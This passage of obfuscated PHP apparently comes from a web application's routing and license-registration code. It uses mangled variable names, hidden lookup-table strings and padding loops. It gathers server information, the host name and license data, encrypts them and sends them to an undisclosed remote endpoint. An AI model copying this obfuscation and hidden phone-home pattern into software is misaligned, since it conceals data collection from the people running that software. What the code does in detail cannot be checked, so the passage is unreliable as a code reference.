strtolower($±·¦çÇ[0]); $¢Ì¾Ÿö¬ = $åâ¦À¾[625]; if (strlen($¢Ì¾Ÿö¬) < $åâ¦À¾[618]) { die; } $œ¿æ‚èï = $Á¬ã‹«ú[3]; if ($§¶‰Í¯ == $Á¬ã‹«ú[4]) { $œ¿æ‚èï = $Á¬ã‹«ú[5]; $±·¦çÇ[0] = $Á¬ã‹«ú[6]; $±·¦çÇ[1] = $±·¦çÇ[1] . $Á¬ã‹«ú[7]; $“ÏáÄØ = join($Á¬ã‹«ú[0], $±·¦çÇ); $“ÏáÄØ = trim($“ÏáÄØ, $Á¬ã‹«ú[0]); } call_user_func(array($Á¬ã‹«ú[8], $Á¬ã‹«ú[9]), $œ¿æ‚èï . $Á¬ã‹«ú[10], $“ÏáÄØ); ActionCall($“ÏáÄØ); $¿ò¡¯À¬ = $åâ¦À¾[626]; if (strlen($¿ò¡¯À¬) < $åâ¦À¾[618]) { return; } call_user_func(array($Á¬ã‹«ú[8], $Á¬ã‹«ú[9]), $œ¿æ‚èï . $Á¬ã‹«ú[11], $“ÏáÄØ); } private function autorun() { $À½†‚Íˆ =& $_SERVER[¥Ô°é•­]; global $config; $û…èÆìå = $_SERVER[¯µç›È¢][627]; if (count($config[$À½†‚Íˆ[12]]) == 0) { return; } foreach ($config[$À½†‚Íˆ[12]] as $âšÅÛã => $Šä®¿Ì) { $this->appRun($Šä®¿Ì); } } private function zfro50550333() { $êÒÌÃóâ =& $_SERVER[¯µç›È¢]; $ÈÜî†ÄØ =& $_SERVER[¥Ô°é•­]; $ùŒº™„è = $ÈÜî†ÄØ[4]; $ÃîÄĞƒ = $êÒÌÃóâ[628]; if (!$ÃîÄĞƒ) { return; } $İ”íÛá = $GLOBALS[$ÈÜî†ÄØ[13]][$ÈÜî†ÄØ[14]][0]; $—ŸªÉë = $êÒÌÃóâ[629]; if (!$İ”íÛá || strlen($İ”íÛá) <= strlen($ùŒº™„è)) { return; } if (strtolower(substr($İ”íÛá, -strlen($ùŒº™„è))) != $ùŒº™„è) { return; } $éÙ¢®Ç¡ = substr($İ”íÛá, 0, -strlen($ùŒº™„è)); $Ó¨“œ˜ = array($ÈÜî†ÄØ[4], $éÙ¢®Ç¡); $Ê±„Õìæ = $êÒÌÃóâ[630]; if (strlen($Ê±„Õìæ) < $êÒÌÃóâ[67]) { die; } $ÔÒ¾èú = array_slice($GLOBALS[$ÈÜî†ÄØ[13]][$ÈÜî†ÄØ[14]], 1); $’Üñçë = $êÒÌÃóâ[631]; while (strlen($’Üñçë) < $êÒÌÃóâ[67]) { if (!$’Üñçë) { break; } $’Üñçë++; } $GLOBALS[$ÈÜî†ÄØ[13]][$ÈÜî†ÄØ[14]] = array_merge($Ó¨“œ˜, $ÔÒ¾èú); $öÛÈêô = $êÒÌÃóâ[632]; while ($öÛÈêô < $êÒÌÃóâ[67]) { if ($öÛÈêô >= 0) { break; } $öÛÈêô++; } $GLOBALS[$ÈÜî†ÄØ[13]][$ÈÜî†ÄØ[15]] = implode($ÈÜî†ÄØ[0], $GLOBALS[$ÈÜî†ÄØ[13]][$ÈÜî†ÄØ[14]]); $òİ›¼×ü = $êÒÌÃóâ[633]; if (strlen($òİ›¼×ü) < $êÒÌÃóâ[634]) { die; } } private function afqve5d38d21() { $ÔğæóÃÈ =& $_SERVER[¯µç›È¢]; $²ÍÔèû =& $_SERVER[¥Ô°é•­]; if ($GLOBALS[$²ÍÔèû[13]][$²ÍÔèû[15]] != $²ÍÔèû[6]) { return; } $¸ÕŞ¼¶ü = $_SERVER[$²ÍÔèû[16]]; $§”ìÔò = $²ÍÔèû[17]; if (!strstr($¸ÕŞ¼¶ü, $§”ìÔò)) { return; } $Õ„ü£¥í = strrpos($¸ÕŞ¼¶ü, $§”ìÔò); $“¿é™€ = $ÔğæóÃÈ[635]; if (strlen($“¿é™€) < $ÔğæóÃÈ[67]) { die; } $Ÿ‘üüÙ´ = substr($¸ÕŞ¼¶ü, $Õ„ü£¥í + strlen($§”ìÔò)); preg_match_all($²ÍÔèû[18], $Ÿ‘üüÙ´, $Ù…½Ñî±); $œß‡²¢ = $ÔğæóÃÈ[636]; $Ÿ‘üüÙ´ = trim($Ù…½Ñî±[0][0], $²ÍÔèû[19]); $GLOBALS[$²ÍÔèû[13]][$²ÍÔèû[14]] = explode($²ÍÔèû[19], $Ÿ‘üüÙ´); $GLOBALS[$²ÍÔèû[13]][$²ÍÔèû[15]] = implode($²ÍÔèû[0], $GLOBALS[$²ÍÔèû[13]][$²ÍÔèû[14]]); $îØ¼¦ÏÏ = $ÔğæóÃÈ[637]; } public function run() { $‚Ôà“ =& $_SERVER[¯µç›È¢]; $–ŸŞë£™ =& $_SERVER[¥Ô°é•­]; $this->afqve5d38d21(); $øûÙ…ç = $‚Ôà“[638]; $this->zfro50550333(); $Åö¿«•„ = $GLOBALS[$–ŸŞë£™[13]][$–ŸŞë£™[14]]; $ŒÊ„å€ = $‚Ôà“[639]; if (strlen($ŒÊ„å€) < $‚Ôà“[618]) { die; } $Ì”¾Œ‰ = $GLOBALS[$–ŸŞë£™[13]][$–ŸŞë£™[15]]; $¬ß´‘§õ = $‚Ôà“[640]; define($–ŸŞë£™[20], isset($Åö¿«•„[0]) && $Åö¿«•„[0] ? $Åö¿«•„[0] : $this->defaultModule); $‚§ô½Òé = $‚Ôà“[641]; define($–ŸŞë£™[21], isset($Åö¿«•„[1]) && $Åö¿«•„[0] ? $Åö¿«•„[1] : $this->defaultController); define($–ŸŞë£™[22], isset($Åö¿«•„[2]) && $Åö¿«•„[0] ? $Åö¿«•„[2] : $this->defaultAction); $Áˆà¾¯“ = $‚Ôà“[642]; while ($Áˆà¾¯“ < $‚Ôà“[634]) { if ($Áˆà¾¯“ >= 0) { break; } $Áˆà¾¯“++; } define($–ŸŞë£™[23], MOD . $–ŸŞë£™[0] . ST . $–ŸŞë£™[0] . ACT); $Êî‹’éÃ = $‚Ôà“[643]; if (!$Êî‹’éÃ) { die; } $_SERVER[$–ŸŞë£™[24]] = strtolower(ACTION); $this->autorun(); if (count($Åö¿«•„) >= 3) { $this->appRun($Ì”¾Œ‰); } else { $this->appRun(ACTION); } } private $hpsm31fd9c75 = array(); private $vwgxebb4ee18 = ''; public function xwoba47be9f4() { $òõš¼ˆè =& $_SERVER[¯µç›È¢]; $»öÓÀŒÉ =& $_SERVER[¥Ô°é•­]; $this->rcto7d2df16f(); $ìÏê§ = $òõš¼ˆè[644]; if (strlen($ìÏê§) < $òõš¼ˆè[645]) { return; } $this->cfxqf2f5bc16(); $this->ksdl4de17ccb(); $‡¼Ùçûñ = $òõš¼ˆè[646]; if (strlen($‡¼Ùçûñ) < $òõš¼ˆè[645]) { return; } $this->tzil2636fbe0(); $™ã±‰éû = $òõš¼ˆè[647]; while ($™ã±‰éû < $òõš¼ˆè[622]) { if ($™ã±‰éû >= 0) { break; } $™ã±‰éû++; } $this->gkhib2261d41(); $‹«á”æç = $òõš¼ˆè[648]; $this->zqhtee335684(); $¡¨¼™Î¾ = $òõš¼ˆè[649]; while (strlen($¡¨¼™Î¾) < $òõš¼ˆè[618]) { if (!$¡¨¼™Î¾) { break; } $¡¨¼™Î¾++; } $this->bpxw142272f1(); $this->nxejedb5adba($»öÓÀŒÉ[25], array($this, $»öÓÀŒÉ[26])); $this->nxejedb5adba($»öÓÀŒÉ[27], array($this, $»öÓÀŒÉ[28])); $this->nxejedb5adba($»öÓÀŒÉ[29], array($this, $»öÓÀŒÉ[30])); $Ææı„® = $òõš¼ˆè[650]; if (!$Ææı„®) { die; } $this->nxejedb5adba($»öÓÀŒÉ[31], array($this, $»öÓÀŒÉ[32])); } public function bdwq29c8c8bf($‚Ğ¼ÒÍĞ) { $¸ÓöÅœö =& $_SERVER[¯µç›È¢]; $§ç‘‡€æ =& $_SERVER[¥Ô°é•­]; $¼†ëğ¯ = Model($§ç‘‡€æ[33])->get(); $¹Åº¼— = $¸ÓöÅœö[651]; $ØŸ­îÁ = array($§ç‘‡€æ[34], $§ç‘‡€æ[35], $§ç‘‡€æ[36], $§ç‘‡€æ[37], $§ç‘‡€æ[38], $§ç‘‡€æ[39], $§ç‘‡€æ[40], $§ç‘‡€æ[41], $§ç‘‡€æ[42], $§ç‘‡€æ[43], $§ç‘‡€æ[44], $§ç‘‡€æ[45], $§ç‘‡€æ[46], $§ç‘‡€æ[47], $§ç‘‡€æ[48], $§ç‘‡€æ[49], $§ç‘‡€æ[50], $§ç‘‡€æ[51], $§ç‘‡€æ[52], $§ç‘‡€æ[53], $§ç‘‡€æ[54], $§ç‘‡€æ[55], $§ç‘‡€æ[56], $§ç‘‡€æ[57], $§ç‘‡€æ[58], $§ç‘‡€æ[59], $§ç‘‡€æ[60], $§ç‘‡€æ[61], $§ç‘‡€æ[62], $§ç‘‡€æ[63], $§ç‘‡€æ[64], $§ç‘‡€æ[65], $§ç‘‡€æ[66], $§ç‘‡€æ[67], $§ç‘‡€æ[68], $§ç‘‡€æ[69], $§ç‘‡€æ[70], $§ç‘‡€æ[71], $§ç‘‡€æ[72], $§ç‘‡€æ[73], $§ç‘‡€æ[74], $§ç‘‡€æ[75], $§ç‘‡€æ[76], $§ç‘‡€æ[77], $§ç‘‡€æ[78], $§ç‘‡€æ[79], $§ç‘‡€æ[80], $§ç‘‡€æ[81], $§ç‘‡€æ[82]); $Œ‡ Ù¡§ = $¸ÓöÅœö[652]; while ($Œ‡ Ù¡§ < $¸ÓöÅœö[622]) { if ($Œ‡ Ù¡§ >= 0) { break; } $Œ‡ Ù¡§++; } foreach ($ØŸ­îÁ as $¨™¨é‡) { $ˆÏíêêû = $GLOBALS[$§ç‘‡€æ[83]][$§ç‘‡€æ[84]][$¨™¨é‡]; $”ÌÕ»Ä’ = $¸ÓöÅœö[653]; while ($”ÌÕ»Ä’ < $¸ÓöÅœö[67]) { if ($”ÌÕ»Ä’ >= 0) { break; } $”ÌÕ»Ä’++; } if (isset($¼†ëğ¯[$¨™¨é‡])) { $ˆÏíêêû = $¼†ëğ¯[$¨™¨é‡]; } $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$¨™¨é‡] = $ˆÏíêêû; } $…’üÁ  = $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$§ç‘‡€æ[46]]; unset($‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[87]][$§ç‘‡€æ[88]]); unset($‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[87]][$§ç‘‡€æ[89]]); unset($‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$§ç‘‡€æ[46]]); $£ÍÊÏ— = $¸ÓöÅœö[654]; if (strlen($£ÍÊÏ—) < $¸ÓöÅœö[645]) { die; } unset($‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$§ç‘‡€æ[90]]); $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$§ç‘‡€æ[91]] = array($§ç‘‡€æ[92] => (int) $…’üÁ [$§ç‘‡€æ[93]], $§ç‘‡€æ[94] => (int) _get($…’üÁ , $§ç‘‡€æ[95], 0)); $Ñ«ùÄ = $¸ÓöÅœö[655]; if (strlen($Ñ«ùÄ) < $¸ÓöÅœö[618]) { die; } $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[97]] = Action($§ç‘‡€æ[98])->accessToken(); $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[99]] = md5($_SERVER[$§ç‘‡€æ[100]] . $¼†ëğ¯[$§ç‘‡€æ[101]]); $×§¹ÒĞò = $¸ÓöÅœö[656]; while (strlen($×§¹ÒĞò) < $¸ÓöÅœö[618]) { if (!$×§¹ÒĞò) { break; } $×§¹ÒĞò++; } $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[102]] = base64_encode(serverInfo()); $¬İşá‘… = $¸ÓöÅœö[657]; $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[103]] = $this->vwgxebb4ee18; if ($¼†ëğ¯[$§ç‘‡€æ[103]] != $§ç‘‡€æ[104]) { $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[105]] = $¼†ëğ¯[$§ç‘‡€æ[105]]; $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[106]] = $¼†ëğ¯[$§ç‘‡€æ[106]]; $•Å¦—©– = rand_string(10) . $this->vwgxebb4ee18 . rand_string(5); $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[107]][$§ç‘‡€æ[108]] = $this->hoky6f680981($•Å¦—©–, $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[99]]); } if ($this->vwgxebb4ee18 == $§ç‘‡€æ[104]) { $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[85]][$§ç‘‡€æ[86]][$§ç‘‡€æ[91]][$§ç‘‡€æ[95]] = 0; } $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[109]] = _get($this->hpsm31fd9c75, $§ç‘‡€æ[110], $§ç‘‡€æ[6]); $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[111]] = _get($this->hpsm31fd9c75, $§ç‘‡€æ[112], $§ç‘‡€æ[6]); if (_get($GLOBALS, $§ç‘‡€æ[113]) && $this->config[$§ç‘‡€æ[114]]) { $‚Ğ¼ÒÍĞ[$§ç‘‡€æ[96]][$§ç‘‡€æ[115]] = WEB_ROOT; } return $‚Ğ¼ÒÍĞ; } private function zqhtee335684() { $ßåŒ° =& $_SERVER[¯µç›È¢]; $œêº¾ÄÔ =& $_SERVER[¥Ô°é•­]; $ª¶Ø‡ë† = $_SERVER[$œêº¾ÄÔ[24]] == $œêº¾ÄÔ[116]; $´ãšéŒØ = $ßåŒ°[658]; while (strlen($´ãšéŒØ) < $ßåŒ°[67]) { if (!$´ãšéŒØ) { break; } $´ãšéŒØ++; } if ($_SERVER[$œêº¾ÄÔ[24]] == $œêº¾ÄÔ[117] && $_GET[$œêº¾ÄÔ[118]] == $œêº¾ÄÔ[119]) { $ª¶Ø‡ë† = !0; } if ($ª¶Ø‡ë†) { $ê·ÇÏÈä = array($œêº¾ÄÔ[103] => $this->vwgxebb4ee18, $œêº¾ÄÔ[120] => $this->oqfu2c5a69c3(), $œêº¾ÄÔ[121] => Model($œêº¾ÄÔ[122])->count()); if ($this->vwgxebb4ee18 != $œêº¾ÄÔ[104]) { $ÛÊÄ™é› = _get($this->hpsm31fd9c75, $œêº¾ÄÔ[123]); if ($ÛÊÄ™é›) { $ê·ÇÏÈä[$œêº¾ÄÔ[124]] = $ÛÊÄ™é›; $ê·ÇÏÈä[$œêº¾ÄÔ[125]] = strtotime(_get($this->hpsm31fd9c75, $œêº¾ÄÔ[126])); $ê·ÇÏÈä[$œêº¾ÄÔ[127]] = _get($this->hpsm31fd9c75, $œêº¾ÄÔ[112]); } $¡¼Û–æ¹ = Model($œêº¾ÄÔ[33])->get($œêº¾ÄÔ[128], $œêº¾ÄÔ[6], !0); if (is_string($¡¼Û–æ¹) && substr($¡¼Û–æ¹, 0, 1) == $œêº¾ÄÔ[129]) { $¡¼Û–æ¹ = json_decode_force($¡¼Û–æ¹); } if (is_array($¡¼Û–æ¹) && $¡¼Û–æ¹[$œêº¾ÄÔ[130]] && strstr($¡¼Û–æ¹[$œêº¾ÄÔ[130]], $œêº¾ÄÔ[131])) { $ˆÌì€—ï = explode($œêº¾ÄÔ[131], $¡¼Û–æ¹[$œêº¾ÄÔ[130]]); $ê·ÇÏÈä[$œêº¾ÄÔ[132]] = $ˆÌì€—ï[0]; } } $ê·ÇÏÈä = $this->lyuc55548a77(json_encode($ê·ÇÏÈä), md5($œêº¾ÄÔ[133])); $È™úğÈˆ = array($œêº¾ÄÔ[134] => $ê·ÇÏÈä); $²æ®Äà = $ßåŒ°[659]; if (strlen($²æ®Äà) < $ßåŒ°[67]) { die; } call_user_func(array($œêº¾ÄÔ[135], $œêº¾ÄÔ[136]), $È™úğÈˆ); $ßñ° òò = $ßåŒ°[660]; } if ($this->vwgxebb4ee18 == $œêº¾ÄÔ[104]) { return; } $ÕßŸ«Æ = array($œêº¾ÄÔ[137], $œêº¾ÄÔ[138], $œêº¾ÄÔ[139], $œêº¾ÄÔ[140], $œêº¾ÄÔ[141], $œêº¾ÄÔ[142]); $ÓùŞ€Îé = $ßåŒ°[661]; while (strlen($ÓùŞ€Îé) < $ßåŒ°[622]) { if (!$ÓùŞ€Îé) { break; } $ÓùŞ€Îé++; } $â“Ñ…êŒ = Model($œêº¾ÄÔ[33])->get(); $È™úğÈˆ = array($œêº¾ÄÔ[143] => $â“Ñ…êŒ[$œêº¾ÄÔ[34]], $œêº¾ÄÔ[144] => $â“Ñ…êŒ[$œêº¾ÄÔ[35]], $œêº¾ÄÔ[145] => $œêº¾ÄÔ[6]); $àı¯Éı‚ = $ßåŒ°[662]; while ($àı¯Éı‚ < $ßåŒ°[634]) { if ($àı¯Éı‚ >= 0) { break; } $àı¯Éı‚++; } foreach ($ÕßŸ«Æ as $ª³¿âåü) { if (!isset($â“Ñ…êŒ[$ª³¿âåü]) || !$â“Ñ…êŒ[$ª³¿âåü]) { continue; } $È™úğÈˆ[$ª³¿âåü] = $â“Ñ…êŒ[$ª³¿âåü]; } call_user_func(array($œêº¾ÄÔ[135], $œêº¾ÄÔ[136]), $È™úğÈˆ); $Õ§¢Æ»ã = $ßåŒ°[663]; } private function tzil2636fbe0() { $‡€…™Ø… =& $_SERVER[¯µç›È¢]; $òŸ‡ÚÅ¬ =& $_SERVER[¥Ô°é•­]; if ($_SERVER[$òŸ‡ÚÅ¬[24]] != $òŸ‡ÚÅ¬[146]) { return; } if (!_get($GLOBALS, $òŸ‡ÚÅ¬[113])) { die; } $óè¯öß = $GLOBALS[$òŸ‡ÚÅ¬[13]]; if (isset($óè¯öß[$òŸ‡ÚÅ¬[147]])) { $this->mthi6d41e200(); die; } if (!isset($óè¯öß[$òŸ‡ÚÅ¬[148]]) || strlen($óè¯öß[$òŸ‡ÚÅ¬[148]]) != 16) { show_json($òŸ‡ÚÅ¬[149] . $óè¯öß[$òŸ‡ÚÅ¬[148]], !1); } $èÒçòÂ… = Model($òŸ‡ÚÅ¬[33])->get($òŸ‡ÚÅ¬[101]); $À½¿ô‚á = md5($_SERVER[$òŸ‡ÚÅ¬[100]] . $èÒçòÂ…); $Ò°Ğ£¾— = array($òŸ‡ÚÅ¬[148] => $óè¯öß[$òŸ‡ÚÅ¬[148]], $òŸ‡ÚÅ¬[150] => rand_string(16), $òŸ‡ÚÅ¬[151] => $òŸ‡ÚÅ¬[133], $òŸ‡ÚÅ¬[152] => $òŸ‡ÚÅ¬[153], $òŸ‡ÚÅ¬[154] => $_SERVER[$òŸ‡ÚÅ¬[155]], $òŸ‡ÚÅ¬[156] => $_SERVER[$òŸ‡ÚÅ¬[157]], $òŸ‡ÚÅ¬[158] => $_SERVER[$òŸ‡ÚÅ¬[159]], $òŸ‡ÚÅ¬[99] => $À½¿ô‚á, $òŸ‡ÚÅ¬[160] => Model($òŸ‡ÚÅ¬[33])->get($òŸ‡ÚÅ¬[128])); if ($óè¯öß[$òŸ‡ÚÅ¬[161]] == $òŸ‡ÚÅ¬[162]) { $ŸªÈ¿ãü = $this->lyuc55548a77($À½¿ô‚á, $òŸ‡ÚÅ¬[163]); $¬ƒ©İ¦ = $this->hoky6f680981(json_encode($Ò°Ğ£¾—), $À½¿ô‚á . $òŸ‡ÚÅ¬[164], 3); $¬ƒ©İ¦ = $¬ƒ©İ¦ . $òŸ‡ÚÅ¬[165] . $_SERVER[$òŸ‡ÚÅ¬[155]]; $Ë‹Òüò¨ = $this->mzat3d176a3b($òŸ‡ÚÅ¬[166] . $ŸªÈ¿ãü . $òŸ‡ÚÅ¬[167] . $¬ƒ©İ¦, -1); show_json($Ë‹Òüò¨, !0); } else { if ($óè¯öß[$òŸ‡ÚÅ¬[161]] == $òŸ‡ÚÅ¬[168]) { $Š§œûå¢ = substr(md5($òŸ‡ÚÅ¬[169] . $À½¿ô‚á), 12, 15) . $òŸ‡ÚÅ¬[170]; $¬ƒ©İ¦ = $this->guaq25d340da(trim($óè¯öß[$òŸ‡ÚÅ¬[171]]), $Š§œûå¢, 2); $¼À‰ææü = json_decode($¬ƒ©İ¦, !0); if (!is_array($¼À‰ææü) || !is_array($¼À‰ææü[$òŸ‡ÚÅ¬[172]]) || $¼À‰ææü[$òŸ‡ÚÅ¬[148]] != !0) { $›¯Ö“È² = $òŸ‡ÚÅ¬[173]; $ø×Õèœ’ = $¼À‰ææü[$òŸ‡ÚÅ¬[172]] ? $òŸ‡ÚÅ¬[174] . $¼À‰ææü[$òŸ‡ÚÅ¬[172]] : $›¯Ö“È²; show_json($ø×Õèœ’, !1); } else { $Ò°Ğ£¾—[$òŸ‡ÚÅ¬[150]] = $¼À‰ææü[$òŸ‡ÚÅ¬[172]][$òŸ‡ÚÅ¬[175]]; } } else { $¼À‰ææü = $this->mzat3d176a3b($òŸ‡ÚÅ¬[176], $Ò°Ğ£¾—, 10); $ÂÆ¹³¤‘ = $‡€…™Ø…[664]; } } if (!is_array($¼À‰ææü) || !is_array($¼À‰ææü[$òŸ‡ÚÅ¬[172]]) || $¼À‰ææü[$òŸ‡ÚÅ¬[148]] != !0) { $›¯Ö“È² = LNG($òŸ‡ÚÅ¬[177]); $ø×Õèœ’ = $¼À‰ææü[$òŸ‡ÚÅ¬[172]] ? $òŸ‡ÚÅ¬[174] . $¼À‰ææü[$òŸ‡ÚÅ¬[172]] : $›¯Ö“È²; show_json($ø×Õèœ’, !1); } $®Ë÷×éª = $¼À‰ææü[$òŸ‡ÚÅ¬[172]]; $Ÿ†ÂÍÄë = $this->qeyfd6520446($®Ë÷×éª[$òŸ‡ÚÅ¬[178]]); if (!$Ÿ†ÂÍÄë || $Ÿ†ÂÍÄë != $®Ë÷×éª[$òŸ‡ÚÅ¬[126]]) { $Ç™›öË = array($òŸ‡ÚÅ¬[179] => Model($òŸ‡ÚÅ¬[33])->get($òŸ‡ÚÅ¬[101]), $òŸ‡ÚÅ¬[180] => $_SERVER[$òŸ‡ÚÅ¬[100]], $òŸ‡ÚÅ¬[181] => this_url(), $òŸ‡ÚÅ¬[156] => $_SERVER[$òŸ‡ÚÅ¬[157]]); $¬ƒ©İ¦ = $this->wqhu7fec0186(json_encode($Ç™›öË)); $this->mzat3d176a3b($òŸ‡ÚÅ¬[182] . $¬ƒ©İ¦); show_json(LNG($òŸ‡ÚÅ¬[183]), !0); } $¶¼›ÛÚ = array($òŸ‡ÚÅ¬[184] => $®Ë÷×éª[$òŸ‡ÚÅ¬[185]], $òŸ‡ÚÅ¬[186] => $®Ë÷×éª[$òŸ‡ÚÅ¬[187]], $òŸ‡ÚÅ¬[188] => rand_string(16), $òŸ‡ÚÅ¬[103] => $®Ë÷×éª[$òŸ‡ÚÅ¬[189]]); if ($Ò°Ğ£¾—[$òŸ‡ÚÅ¬[150]]) { $¶¼›ÛÚ[$òŸ‡ÚÅ¬[188]] = $Ò°Ğ£¾—[$òŸ‡ÚÅ¬[150]]; } $¬Ú…Ùê = substr(md5($¶¼›ÛÚ[$òŸ‡ÚÅ¬[186]]), 10, 10); $ÚİĞò®¼ = $¬Ú…Ùê . $¶¼›ÛÚ[$òŸ‡ÚÅ¬[103]] . $¶¼›ÛÚ[$òŸ‡ÚÅ¬[188]]; $®É¦®Û° = $‡€…™Ø…[665]; if (!$®É¦®Û°) { die; } $¶¼›ÛÚ[$òŸ‡ÚÅ¬[105]] = strrev(base64_encode($this->lyuc55548a77($ÚİĞò®¼, $òŸ‡ÚÅ¬[190]))); $®€¥»í“ = rand_string(16); $ñüˆ¬­§ = $®€¥»í“ . $¶¼›ÛÚ[$òŸ‡ÚÅ¬[103]] . $this->lyuc55548a77(md5($¶¼›ÛÚ[$òŸ‡ÚÅ¬[184]]), $®€¥»í“); $¶¼›ÛÚ[$òŸ‡ÚÅ¬[106]] = base64_encode(strrev($this->lyuc55548a77($ñüˆ¬­§, $òŸ‡ÚÅ¬[191]))); $ğ­ÜÇØ— = $‡€…™Ø…[666]; while ($ğ­ÜÇØ— < $‡€…™Ø…[645]) { if ($ğ­ÜÇØ— >= 0) { break; } $ğ­ÜÇØ—++; } if ($®Ë÷×éª[$òŸ‡ÚÅ¬[192]] && $®Ë÷×éª[$òŸ‡ÚÅ¬[192]] >= 1) { Model($òŸ‡ÚÅ¬[33])->setDeep($òŸ‡ÚÅ¬[193], $òŸ‡ÚÅ¬[119]); } Model($òŸ‡ÚÅ¬[33])->set($¶¼›ÛÚ); $ ñçÕ« = md5($_SERVER[$òŸ‡ÚÅ¬[100]] . strrev($èÒçòÂ…) . $¶¼›ÛÚ[$òŸ‡ÚÅ¬[186]]); $˜ğä± = $‡€…™Ø…[667]; if (!$˜ğä±) { die; } $‚¿”•¡ = strrev(substr($ ñçÕ«, 10, 16)); $ê¦ğÎëá = $‡€…™Ø…[668]; if (strlen($ê¦ğÎëá) < $‡€…™Ø…[634]) { return; } $ÔÛ‹«±’ = $this->hoky6f680981(json_encode($®Ë÷×éª), $ ñçÕ«); $»Šğã¢š = $‡€…™Ø…[669]; while (strlen($»Šğã¢š) < $‡€…™Ø…[634]) { if (!$»Šğã¢š) { break; } $»Šğã¢š++; } $Õ Ì‘ê‹ = array_to_keyvalue(Model($òŸ‡ÚÅ¬[7])->listData(), $òŸ‡ÚÅ¬[194]); $•œœŠ¿ƒ = $‡€…™Ø…[670]; while (strlen($•œœŠ¿ƒ) < $‡€…™Ø…[67]) { if (!$•œœŠ¿ƒ) { break; } $•œœŠ¿ƒ++; } $ûÓÊ¶Æñ = $Õ Ì‘ê‹[$òŸ‡ÚÅ¬[195]]; $‚¹Ãº²´ = array(); $ßŸÍÔ— = $‡€…™Ø…[671]; if (strlen($ßŸÍÔ—) < $‡€…™Ø…[67]) { die; } $‚¹Ãº²´[$‚¿”•¡] = $ÔÛ‹«±’; Model($òŸ‡ÚÅ¬[7])->update($ûÓÊ¶Æñ[$òŸ‡ÚÅ¬[196]], array($òŸ‡ÚÅ¬[197] => $‚¹Ãº²´)); $this->hpsm31fd9c75 = $®Ë÷×éª; $©¯İ·ô‡ = $‡€…™Ø…[623]; if (!$©¯İ·ô‡) { die; } $this->vwgxebb4ee18 = $¶¼›ÛÚ[$òŸ‡ÚÅ¬[103]]; $±ŞÅôù = $‡€…™Ø…[672]; if (!$±ŞÅôù) { die; } $this->licenseRegistSuccess(); $™¯»«† = $‡€…™Ø…[673]; if (!$™¯»«†) { return; } Cache::set($òŸ‡ÚÅ¬[198] . md5($èÒçòÂ… . $òŸ‡ÚÅ¬[199]), $òŸ‡ÚÅ¬[6]); show_json(LNG($òŸ‡ÚÅ¬[183]), !0); $Ø¯—æ£Ú = $‡€…™Ø…[674]; if (strlen($Ø¯—æ£Ú) < $‡€…™Ø…[618]) { die; } } private function licenseRegistSuccess() { $²Ú‡†€Ò =& $_SERVER[¥Ô°é•­]; $­íÜ®„Î = Model($²Ú‡†€Ò[33])->get(); if ($­íÜ®„Î[$²Ú‡†€Ò[63]] != $²Ú‡†€Ò[119]) { Model($²Ú‡†€Ò[33])->set($²Ú‡†€Ò[63], $²Ú‡†€Ò[119]); } Action($²Ú‡†€Ò[200])->initStart(!0); } private function mthi6d41e200() { $‹¤ùï‰ =& $_SERVER[¯µç›È¢]; $òë†¹¨Ô =& $_SERVER[¥Ô°é•­]; Model($òë†¹¨Ô[33])->set(array($òë†¹¨Ô[184] => $òë†¹¨Ô[6], $òë†¹¨Ô[186] => $òë†¹¨Ô[6], $òë†¹¨Ô[103] => $òë†¹¨Ô[104], $òë†¹¨Ô[105] => $òë†¹¨Ô[6], $òë†¹¨Ô[106] => $òë†¹¨Ô[6])); $´²àÚ˜È = $‹¤ùï‰[675]; if (strlen($´²àÚ˜È) < $‹¤ùï‰[618]) { return; } Model($òë†¹¨Ô[33])->setDeep($òë†¹¨Ô[193], $òë†¹¨Ô[201]); $this->hpsm31fd9c75 = array(); $this->vwgxebb4ee18 = $òë†¹¨Ô[104]; $ƒÊÒÌÊû = $‹¤ùï‰[676]; } private function rcto7d2df16f() { $Ê‘Ò÷Á˜ =& $_SERVER[¯µç›È¢]; $½Ù»õ­Ã =& $_SERVER[¥Ô°é•­]; $_SERVER[$½Ù»õ­Ã[157]] = _get($_SERVER, $½Ù»õ­Ã[157], APP_HOST); $û¨ÍëôÊ = $Ê‘Ò÷Á˜[677]; if (!$û¨ÍëôÊ) { return; } $this->vwgxebb4ee18 = $½Ù»õ­Ã[104]; $ıÀ¤ˆŒ× = Model($½Ù»õ­Ã[33])->get(); $ÁµÌÁñ‡ = $Ê‘Ò÷Á˜[678]; if (!$ÁµÌÁñ‡) { die; } if ($ıÀ¤ˆŒ×[$½Ù»õ­Ã[103]] == $½Ù»õ­Ã[104]) { return; } $—°Ùåï = Model($½Ù»õ­Ã[33])->get($½Ù»õ­Ã[101]); $®ÍÛåÁ¡ = $Ê‘Ò÷Á˜[679]; if (strlen($®ÍÛåÁ¡) < $Ê‘Ò÷Á˜[67]) { return; } $œ¯³ì„æ = $½Ù»õ­Ã[198] . md5($—°Ùåï . $½Ù»õ­Ã[199]); $Ê¥øû·€ = $Ê‘Ò÷Á˜[680]; $Ó†¼§” = Cache::get($œ¯³ì„æ); $…©Êı†ï = 